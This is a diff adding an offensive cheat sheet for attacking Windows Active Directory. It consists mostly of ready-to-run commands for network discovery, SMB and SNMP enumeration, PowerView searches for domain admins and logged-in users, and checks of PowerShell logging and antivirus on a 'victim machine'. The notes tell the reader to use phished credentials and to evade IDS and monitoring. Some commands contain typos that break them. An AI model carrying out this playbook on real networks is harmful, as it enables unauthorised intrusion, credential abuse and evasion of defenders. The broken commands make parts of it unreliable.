@@ -1,0 +1,124 @@
+Attacking Windows Active Directory
+
+Nmap will be picked up by IDS solutions. 
+To identify targets, use nbtscan against the organization's IP range. As follows:
+jynx$: nbtscan -r <range>
+In addition, perform reverse DNS queries to identify hostnames using nmap. As follows:
+jynx$: nmap -sL <target or range>
+Seperately, Metasploit's smb_version module can be used to scan networks for Windows systems.
+jynx$: msfconsole
+jynx$: use auxiliary/scanner/smb/smb_version
+Also, investigate SNMP misconfigurations. 
+jynx$: use auxiliary/scanner/snmp/snmp_login
+If you find an SNMPv1 or SNMPv2c community string, aquired through sniffing, then we can perform a Management Information Base (MIB) walk. As follows:
+jynx$: snmpcheck.pl -c <community_string> -t ip
+Also, find the authoritative domain controller using dig. You can typically finding the domain name by guessing it, example: companyname.local (remember the ".local"). 
+jynx$: dig -t NS <domain_name> or jynx$: dig _gc. <domain_name>
+While rare, still try to abuse SMB and NULL sessions. 
+jynx$: rpcclient -U <username> <IPaddress>
+NULL: jynx$: rpcclient -U "" <IPaddress>
+Should we have phished domain credentials, then we can enumerate activities over an SMB authenticated session, using rpcclient, as follows:
+cat ips.txt | while read line
+> do
+> echo $line && rpcclient -U "<domain>\<username>%<password>" -c "enumdomusers;quit"
+$line
+> done
+To get information regarding a server:
+jynx$: rpcclient $> srvinfo
+To enumerate domain users:
+jynx$: rpcclient $> enumdomusers
+To enumerate domain and built-in groups:
+jynx$: rpcclient $> enumalsgroups domain
+jynx$: rpcclient $> enumalsgroups builtin
+To indentify a SID, we can use the following for a user or group:
+jynx$: rpcclient $> lookupnames <username or groupname>
+With the RIDs discovered, we can find the original admin on a Windows machine. As follows:
+jynx$: rpcclient $> queryuser <RID>
+Perform share enumeration, using enum4linux, smbmap, and/or nmap script "smb-enum-shares". If you have valid credentials, you can enumerate shares on a target machine using:
+jynx$: smbclient -U "<Domain>\<username>%<password>" -L <hostname>
+With access to a share, look through it for sensitive information. 
+In older Windows systems, you can attempt to perform RestrictAnonymous bypass technique, "Anonymous SID to username translation," which enables username enumeration through a SID walk. dumpusers is a tool that can perform this activity. Other tools can help as well. What we're trying to do it land in the "Authenticated Users" group, by using any learned set of credentials. The SNMP community string is required to achieve this. 
+jynx$: nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.<domain_name>
+The above can also be accomplished using powershell, as follows:
+PowerShell C:\jynx> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+Domain controller discovery can also be achieved using:
+CommandPrompt C:\jynx> nltest /server:<IP_of_any_member> /dclist:<domain_name>
+Also, finding workgroups and domains:
+CommandPrompt C:\jynx> net view /domain
+Finding member systems of the domain:
+CommandPrompt C:\jynx> net view /domain:<domain_name>
+We can also identify hostnames via DNS:
+CommandPrompt C:\jynx> nslookup <ip_of_any_member>
+A loop of the above can be carried out, as follows:
+CommandPrompt C:\jynx> for /L %i in (1,1,255) do @nslookup 10.10.10.%i [server to resolve from] 2>nul | find "Name" && echo 10.10.10.%i
+nbtstat can also be used to find a remote machine's MAC, hostname, and domain membership, as follows:
+CommandPrompt C:\jynx> nbtstat -A <remote_IP>
+Similarly, a loop can be performed:
+CommandPrompt C:\jynx> for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i
+Look in the shares with insufficiently secured permissions:
+CommandPrompt C:\jynx> net use e: \\<ip>\ipc$ <password> /user:<domain>\<username>
+CommandPrompt C:\jynx> net view \\ip
+SEPERATE RESOURCE HERE, FINDING USER ACCOUNTS: https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20
+--
+Moving forward, additional enumeration will be carried out using PowerView and AD Powershell module. These can be found in the following:
+Use both, they have different modules: 
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+Using an elevated shell, on a WIN10 machine install using: https://docs.microsoft.com/en-us/archive/blogs/ashleymcglone/install-the-active-directory-powershell-module-on-windows-10
+Using an elevated shell, on a Windows Server machine, simply:
+CommandPrompt C:\jynx> Import-Module ServerManager
+CommandPrompt C:\jynx> Add-WindowsFeature RSAT-AD-PowerShell
+Using AD Powershell, we can identify machines inside the domain or do reverse lookups via LDAP, as follows:
+CommandPrompt C:\jynx> get-adcomputer -filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address
+CommandPrompt C:\jynx> get-adcomputer -filter {ipv4address -eq '<IP>'} -Properties Lastlogondate,passwordlastset,ipv4address
+Moving on, we can perform SPN scanning to discover servers and services, without port scanning.
+CommandPrompt C:\jynx> Find-PSServiceAccounts (https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts)
+PowerShell C:\jynx> Get-ADComputer -filter {ServicePrincipleName -Like "*SPN*" } -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipleName,TrustedForDelegation,TrustedtoAuthForDelegation
+We can also learn what group policies are avaliable inside a domain:
+PowerShell C:\jynx> Get-NetGPO | select displayname,name,whenchanged
+We can learn what domain admins are easily discovered:
+PowerShell C:\jynx> Get-NetGroupMember 'Domain Admins' -Recurse
+We can find whose logged-in where:
+PowerShell C:\jynx> Invoke-UserHunter -Stealth -ShowAll (-Stealth queries servers that everyone talks to -- its more secure)
+Finding local administrators on a target machine:
+CommandPrompt C:\jynx> ([ADSI]'WinNT://zG/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)} 
+PowerShell C:\jynx> Get-NetLocalGroup -ComputerName <computer_name>
+PowerShell C:\jynx> Get-NetLocalGroup -ComputerName <computer_name> -API
+PowerShell C:\jynx> Get-NetLocalGroup -ComputerName <computer_name> -Recurse
+You can find domain admins of the domain, justing the following:
+PowerShell C:\jynx> Get-NetGroupMembers -GroupName "Domain Admins"
+PowerShell C:\jynx> Get-NetGroupMembers -GroupName "Denied RODC Password Replication Group" -Recurse
+You can then identify Administrator accounts with GPO enumeration and abuse:
+PowerShell C:\jynx> Find-GPOLocation -UserName <username>
+For those with RDP access in the domain, use:
+PowerShell C:\jynx> Find-GPOLocation -UserName <username> -LocalGroup RDP
+Use extensive powershell to learn admins, users, and groups. 
+Powershell is extensively monitored so consider using these tools also.
+https://github.com/the-useless-one/pywerview
+https://github.com/ropnop/windapsearch
+------
+Map HTTP Services
+Use Eyewiteness or Clustered: https://github.com/hatRiot/clusterd
+------
+Once you get on a victim machine, be careful.  You'll want to identify the Powershell version and logging.
+PowerShell C:\jynx> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowershellEngine /v PowershellVersion
+PowerShell C:\jynx> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowershellEngine /v PowershellVersion
+PowerShell C:\jynx> Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowershellEngine -Name PowerShellVersion
+
+Identify Logging:
+PowerShell C:\jynx> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
+PowerShell C:\jynx> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+PowerShell C:\jynx> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+
+Use WMIC to learn information about the system:
+CommandPrompt C:\jynx> wmic alias list brief
+CommandPrompt C:\jynx> wmic computersystem list full
+CommandPrompt C:\jynx> wmic volume list brief
+CommandPrompt C:\jynx> wmic /namespace:\\root\securitycenter2 path antivirusproduce GET displayName,productState, pathToSignedProductExe
+CommandPrompt C:\jynx> wmic qfe list brief
+CommandPrompt C:\jynx> wmix useraccount list
+
+
+
+
+
